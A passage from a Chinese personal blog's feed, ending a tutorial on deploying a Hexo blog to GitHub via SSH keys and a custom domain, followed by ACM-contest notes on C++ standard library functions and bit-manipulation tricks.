class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh-keygen -t rsa -C <span class="hljs-string">&quot;youremail&quot;</span><br>这个时候它会告诉你已经生成了.ssh的文件夹。根据提示，在你的电脑中找到这个文件夹。<br>其中，id_rsa是你这台电脑的私人秘钥，不能给别人看的，id_rsa.pub是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。<br></code></pre></div></td></tr></table></figure><p>然后在GitHub的 setting 中，找到SSH keys的设置选项，点击New SSH key<br>把你的id_rsa.pub里面的信息复制进去即可。</p><p><img src="https://img-blog.csdnimg.cn/20210407201710573.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/20210407201728580.png" alt="5"><br><img src="https://img-blog.csdnimg.cn/20210407201747105.png" alt="6"><br><img src="https://img-blog.csdnimg.cn/20210407201804137.png" alt="7"></p><p>title 可以随便填。</p><p>也可以查看是否成功</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh -T git@github.com<br></code></pre></div></td></tr></table></figure><h3 id="6-将hexo部署到GitHub"><a href="#6-将hexo部署到GitHub" class="headerlink" title="6.将hexo部署到GitHub"></a>6.将hexo部署到GitHub</h3><p>将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 <code>_config.yml</code>，翻到最后，其中，YourgithubName就是你的GitHub账户名称</p><p>修改为</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">deploy:<br>  <span class="hljs-built_in">type</span>: git<br>  repo: https://github.com/YourgithubName/YourgithubName.github.io.git<br>  branch: master<br></code></pre></div></td></tr></table></figure><p>这个时候需要先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">npm install hexo-deployer-git --save<br></code></pre></div></td></tr></table></figure><p>然后</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">hexo clean<br>hexo generate <span class="hljs-comment">//hexo g</span><br>hexo deploy <span class="hljs-comment">//hexo d</span><br></code></pre></div></td></tr></table></figure><p>注意</p><p>hexo d 时可能要你输入username和password。</p><p>过一会儿就可以在<code>http://yourname.github.io</code> 这个网站看到你的博客了！！</p><p>以后，每当修改了内容，都可以用</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hexo g<br>hexo d<br></code></pre></div></td></tr></table></figure><p>去更新GitHub，也可以先用hexo clean 进行清除，再用上面两个。</p><h3 id="7-设置个人域名"><a href="#7-设置个人域名" class="headerlink" title="7.设置个人域名"></a>7.设置个人域名</h3><p>再购买了域名后，进入解析，添加解析。选择 A记录 即可。</p><p>其中，192.30.252.153 和 192.30.252.154 是GitHub的服务器地址。选择其一即可。</p><p>你也可以自己ping 自己的博客</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ping XXXX.github.io<br></code></pre></div></td></tr></table></figure><p>显示出来的就是GitHub服务器的地址。也可以直接用给出的，都是一样的效果。</p><p>在域名解析完成后，再登录GitHub，进入之前创建的仓库，</p><p>在你的仓库中创建一个名为CNAME文件，不要www或者hppt之类的。直接写上你的域名。如：abcdef.com</p><p>过不了多久，再打开你的浏览器，输入你自己的域名，就可以看到搭建的网站啦！</p><hr><h1 id="Hexo配置"><a href="#Hexo配置" class="headerlink" title="Hexo配置"></a>Hexo配置</h1><p>在文件根目录下的<code>_config.yml</code>，就是整个hexo框架的配置文件了。</p><h3 id="1-更换主题"><a href="#1-更换主题" class="headerlink" title="1.更换主题"></a>1.更换主题</h3><p>持续更新中······</p>]]></content>
    
    
    <categories>
      
      <category>学习教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-实用C++自带算法函数及其用法</title>
    <link href="/2021/04/07/ACM-%E5%AE%9E%E7%94%A8C++%E8%87%AA%E5%B8%A6%E7%AE%97%E6%B3%95%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%94%A8%E6%B3%95/"/>
    <url>/2021/04/07/ACM-%E5%AE%9E%E7%94%A8C++%E8%87%AA%E5%B8%A6%E7%AE%97%E6%B3%95%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>记录一些ACM中可能会用到的一些C++自带函数，记录其函数和具体用法。</p><h1 id="一-头文件"><a href="#一-头文件" class="headerlink" title="一. 头文件"></a>一. 头文件</h1><h2 id="1-主要算法头文件"><a href="#1-主要算法头文件" class="headerlink" title="1. 主要算法头文件"></a>1. 主要算法头文件</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bit/stdc++.h&gt; //万能头文件，包含了目前c++所包含的所有头文件。可替换所有头文件。但有部分编译器不可用。</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt; //包括很多常用函数</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;numeric&gt; //只包括几个在序列上面进行简单数学运算的模板函数，包括加法和乘法在序列上的一些操作。</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;functional&gt; //定义了一些模板类，用以声明函数对象。</span></span><br></code></pre></div></td></tr></table></figure><h2 id="2-一些其他常用头文件"><a href="#2-一些其他常用头文件" class="headerlink" title="2. 一些其他常用头文件"></a>2. 一些其他常用头文件</h2><h3 id="include-lt-iomanip-gt-头文件"><a href="#include-lt-iomanip-gt-头文件" class="headerlink" title="#include&lt; iomanip&gt;头文件"></a>#include&lt; iomanip&gt;头文件</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iomanip&gt;</span></span><br><span class="hljs-number">1.</span>控制输出小数点位数(根据保留位数的后一位按照四舍五入舍留)<br>例：输出保留小数点后<span class="hljs-number">3</span>位<br><span class="hljs-keyword">double</span> n=<span class="hljs-number">23.15655</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="hljs-number">3</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//23.157</span><br><span class="hljs-keyword">double</span> n=<span class="hljs-number">23.15645</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="hljs-number">3</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//23.156</span><br><span class="hljs-comment">//注：以后除特别说明外，所有的输出都是一对一。即若有多个输出，则需要多次书写相同的格式。如</span><br><span class="hljs-built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="hljs-number">3</span>)&lt;&lt;n&lt;&lt;fixed&lt;&lt;setprecision(<span class="hljs-number">3</span>)&lt;&lt;m&lt;&lt;<span class="hljs-built_in">endl</span>;<br><br><span class="hljs-number">2.</span>设置字段宽度(空格加数字总共占几个宽度)<br>setw(<span class="hljs-keyword">int</span> n);<br>例：输出数字，并设置宽度分别<span class="hljs-number">1</span>、<span class="hljs-number">3</span>、<span class="hljs-number">5</span><br><span class="hljs-keyword">int</span> n=<span class="hljs-number">7</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">1</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//7 数字前面没有空格</span><br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">3</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//  7 数字前面2个空格</span><br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">5</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//    7 数字前面4个空格</span><br><span class="hljs-keyword">int</span> n=<span class="hljs-number">17</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">3</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">// 17 数字前面1个空格</span><br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">5</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//   17 数字前面3个空格</span><br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">7</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//     17 数字前面5个空格</span><br><br><span class="hljs-number">3.</span>设置其他字符填充(是字符!!!)<br>通常配合setw实用<br>例：输出<span class="hljs-number">7</span>位，开始s和结束t,中间都是b<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&#x27;s&#x27;</span>&lt;&lt;setfill(<span class="hljs-string">&#x27;b&#x27;</span>)&lt;&lt;setw(<span class="hljs-number">7</span>)&lt;&lt;<span class="hljs-string">&#x27;t&#x27;</span>&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//sbbbbbbt t前面6个b</span><br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&#x27;s&#x27;</span>&lt;&lt;setw(<span class="hljs-number">7</span>)&lt;&lt;setfill(<span class="hljs-string">&#x27;b&#x27;</span>)&lt;&lt;<span class="hljs-string">&#x27;t&#x27;</span>&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//sbbbbbbt t前面6个b</span><br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">7</span>)&lt;&lt;<span class="hljs-string">&#x27;s&#x27;</span>&lt;&lt;setfill(<span class="hljs-string">&#x27;b&#x27;</span>)&lt;&lt;<span class="hljs-string">&#x27;t&#x27;</span>&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//      st s前面6个空格</span><br><br></code></pre></div></td></tr></table></figure><h1 id="二-String相关"><a href="#二-String相关" class="headerlink" title="二. String相关"></a>二. String相关</h1><h2 id="1-修改string对象的方法"><a href="#1-修改string对象的方法" class="headerlink" title="1. 修改string对象的方法"></a>1. 修改string对象的方法</h2><h3 id="1-s-insert"><a href="#1-s-insert" class="headerlink" title="1) s.insert()"></a>1) s.insert()</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">s.insert(p,t)<br></code></pre></div></td></tr></table></figure><h1 id="三-数字与字符串函数"><a href="#三-数字与字符串函数" class="headerlink" title="三.数字与字符串函数"></a>三.数字与字符串函数</h1><h2 id="3-1-1-数字转字符串（C）"><a href="#3-1-1-数字转字符串（C）" class="headerlink" title="3.1.1 数字转字符串（C）"></a>3.1.1 数字转字符串（C）</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">int</span> a=<span class="hljs-number">152</span>;<br><span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">sprintf</span>(s,<span class="hljs-string">&quot;%d&quot;</span>,a);<br><span class="hljs-keyword">int</span> len=<span class="hljs-built_in">strlen</span>(s); <span class="hljs-comment">//3</span><br></code></pre></div></td></tr></table></figure><h2 id="3-1-1-字符串转数字（C）"><a href="#3-1-1-字符串转数字（C）" class="headerlink" title="3.1.1 字符串转数字（C）"></a>3.1.1 字符串转数字（C）</h2><p>int sscanf(const char *str, const char *format, …)</p><blockquote><p>str – 这是 C 字符串，是函数检索数据的源。<br>format – 这是 C 字符串，包含了一个或多个：空格字符、非空格字符 和 format 说明符。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> day, year;<br>    <span class="hljs-keyword">char</span> weekday[<span class="hljs-number">20</span>], month[<span class="hljs-number">20</span>];<br>    <span class="hljs-keyword">char</span>* dtm=<span class="hljs-string">&quot;Saturday March 25 1989&quot;</span>;<br>   <span class="hljs-built_in">sscanf</span>(dtm,<span class="hljs-string">&quot;%s%s%d%d&quot;</span>,weekday,month,&amp;day,&amp;year);<br><br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d, %d = %s\n&quot;</span>,month,day,year,weekday);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出</span><br>March <span class="hljs-number">25</span>, <span class="hljs-number">1989</span> = Saturday<br></code></pre></div></td></tr></table></figure><h2 id="3-2-1-数字转字符串（C-）"><a href="#3-2-1-数字转字符串（C-）" class="headerlink" title="3.2.1 数字转字符串（C++）"></a>3.2.1 数字转字符串（C++）</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><br></code></pre></div></td></tr></table></figure><h2 id="3-2-2-字符串转数字（C-）"><a href="#3-2-2-字符串转数字（C-）" class="headerlink" title="3.2.2 字符串转数字（C++）"></a>3.2.2 字符串转数字（C++）</h2><p><strong>字符串分隔</strong></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">string</span> str=<span class="hljs-string">&quot;i am a boy&quot;</span>;  <br>    <span class="hljs-function"><span class="hljs-built_in">istringstream</span> <span class="hljs-title">is</span><span class="hljs-params">(str)</span></span>;  <br>    <span class="hljs-built_in">string</span> s;  <br>    <span class="hljs-keyword">while</span>(is&gt;&gt;s)  &#123;  <br>        <span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;  <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出</span><br>i<br>am <br>a  <br>boy<br></code></pre></div></td></tr></table></figure><p><strong>字符串转数字</strong></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">string</span> str=<span class="hljs-string">&quot;5 15 32 85&quot;</span>;  <br>    <span class="hljs-function"><span class="hljs-built_in">istringstream</span> <span class="hljs-title">is</span><span class="hljs-params">(str)</span></span>;  <br>    <span class="hljs-comment">//is.clear(); //clear()仅仅清空标志位，并没有释放内存。利用stringstream.str(&quot;&quot;)来清空stringstream。</span><br>    <span class="hljs-keyword">int</span> s;  <br>    <span class="hljs-keyword">while</span>(is&gt;&gt;s)  &#123;  <br>        <span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;  <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">5</span><br><span class="hljs-number">15</span><br><span class="hljs-number">32</span><br><span class="hljs-number">85</span><br></code></pre></div></td></tr></table></figure><h1 id="四-string-中的函数"><a href="#四-string-中的函数" class="headerlink" title="四.string 中的函数"></a>四.string 中的函数</h1><h2 id="4-1"><a href="#4-1" class="headerlink" title="4.1"></a>4.1</h2><h3 id="4-1-1-stod"><a href="#4-1-1-stod" class="headerlink" title="4.1.1 stod()"></a>4.1.1 stod()</h3><h3 id="4-1-2-stof"><a href="#4-1-2-stof" class="headerlink" title="4.1.2 stof()"></a>4.1.2 stof()</h3><h3 id="4-1-3-stoi"><a href="#4-1-3-stoi" class="headerlink" title="4.1.3 stoi()"></a>4.1.3 stoi()</h3><h3 id="4-1-4-stol"><a href="#4-1-4-stol" class="headerlink" title="4.1.4 stol()"></a>4.1.4 stol()</h3><h3 id="4-1-5-stold"><a href="#4-1-5-stold" class="headerlink" title="4.1.5 stold()"></a>4.1.5 stold()</h3><h3 id="4-1-6-stoll"><a href="#4-1-6-stoll" class="headerlink" title="4.1.6 stoll()"></a>4.1.6 stoll()</h3><h3 id="4-1-7-stoul"><a href="#4-1-7-stoul" class="headerlink" title="4.1.7 stoul()"></a>4.1.7 stoul()</h3><h3 id="4-1-8-stoull"><a href="#4-1-8-stoull" class="headerlink" title="4.1.8 stoull()"></a>4.1.8 stoull()</h3><h2 id="4-2"><a href="#4-2" class="headerlink" title="4.2"></a>4.2</h2><h3 id="4-2-1-atoi"><a href="#4-2-1-atoi" class="headerlink" title="4.2.1 atoi()"></a>4.2.1 atoi()</h3><p>持续更新中······</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-拓展知识点</title>
    <link href="/2021/04/07/ACM-%E6%8B%93%E5%B1%95%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2021/04/07/ACM-%E6%8B%93%E5%B1%95%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>记录ACM中一些好用的小技巧、方法，以及一些见的少的知识点及其用法。</p><h3 id="1-求负数的绝对值"><a href="#1-求负数的绝对值" class="headerlink" title="1.求负数的绝对值"></a>1.求负数的绝对值</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">方法：取反加<span class="hljs-number">1</span><br>例：求<span class="hljs-number">-125</span>的绝对值<br><span class="hljs-keyword">int</span> n=~<span class="hljs-number">-125</span>+<span class="hljs-number">1</span>; <span class="hljs-comment">//n=125</span><br><span class="hljs-keyword">int</span> m=<span class="hljs-number">-125</span>;<br><span class="hljs-keyword">int</span> t=~m+<span class="hljs-number">1</span>; <span class="hljs-comment">//t=125</span><br></code></pre></div></td></tr></table></figure><h3 id="2-求素数"><a href="#2-求素数" class="headerlink" title="2.求素数"></a>2.求素数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">分为奇、偶数求。<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isprime</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>&#123;<br><span class="hljs-keyword">if</span>(n%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//2需特判</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">3</span>;i&lt;=<span class="hljs-built_in">sqrt</span>(n);i+=<span class="hljs-number">2</span>)&#123; <span class="hljs-comment">//奇数只能由奇数的积得来，3需要特判</span><br><span class="hljs-keyword">if</span>(n%i==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-求2个数的平均数"><a href="#3-求2个数的平均数" class="headerlink" title="3.求2个数的平均数"></a>3.求2个数的平均数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">正常求两个数的平均数为相加除以<span class="hljs-number">2</span>，但如果是两个很大的数呢？以至于相加的结果超出了所有整数类型的范围？相加的结果超出了数据的最大范围值时。这时为防止这样的两个很大的数相加的结果超出数据类型的最大值。采用新的求法。<br><span class="hljs-keyword">int</span> a=<span class="hljs-number">100</span>,b=<span class="hljs-number">62</span>;<br><span class="hljs-keyword">int</span> mid1=(a+b)/<span class="hljs-number">2</span>; <span class="hljs-comment">//常规做法</span><br><span class="hljs-keyword">int</span> mid2=(b-a)/<span class="hljs-number">2</span>+a; <span class="hljs-comment">//技巧算法</span><br></code></pre></div></td></tr></table></figure><h3 id="4-求2的n次方"><a href="#4-求2的n次方" class="headerlink" title="4.求2的n次方"></a>4.求2的n次方</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> t=<span class="hljs-number">1</span>&lt;&lt;n; <span class="hljs-comment">//2的n次方</span><br>补充:<br>m&lt;&lt;t;<span class="hljs-comment">//m乘以2的t次方 m*(2^t)</span><br><span class="hljs-keyword">int</span> m=n&lt;&lt;<span class="hljs-number">1</span>; <span class="hljs-comment">//n乘以2</span><br>m&gt;&gt;t;<span class="hljs-comment">//m除以2的t次方 m/(2^t)</span><br><span class="hljs-keyword">int</span> m=n&gt;&gt;<span class="hljs-number">1</span>; <span class="hljs-comment">//n除以2</span><br></code></pre></div></td></tr></table></figure><h3 id="5-求一个数取余2的n次方后的数"><a href="#5-求一个数取余2的n次方后的数" class="headerlink" title="5.求一个数取余2的n次方后的数"></a>5.求一个数取余2的n次方后的数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">因为<span class="hljs-number">2</span>的次方用二进制来表示会成为<span class="hljs-number">1000.</span>..的形式，所以也可以通过按位与运算来进行取余，因为凡是后面不为<span class="hljs-number">0</span>的为对应的都是余数。<br>n&amp;<span class="hljs-number">3</span>;<span class="hljs-comment">//n取余4</span><br>n&amp;((<span class="hljs-number">1</span>&lt;&lt;m)<span class="hljs-number">-1</span>);<span class="hljs-comment">//n取余2^m</span><br></code></pre></div></td></tr></table></figure><h3 id="6-求两个数的最大公约数"><a href="#6-求两个数的最大公约数" class="headerlink" title="6.求两个数的最大公约数"></a>6.求两个数的最大公约数</h3><blockquote><p>1.辗转相除法<br>a，b不可以为 0。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> a, b, i;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入两个整数：\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a=&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b=&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;b);<br>    i = a % b;<br>    <span class="hljs-keyword">while</span>(i != <span class="hljs-number">0</span>)&#123;<br>        a = b;<br>        b = i;<br>        i = a % b;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,b);<br>    <span class="hljs-keyword">return</span> <span 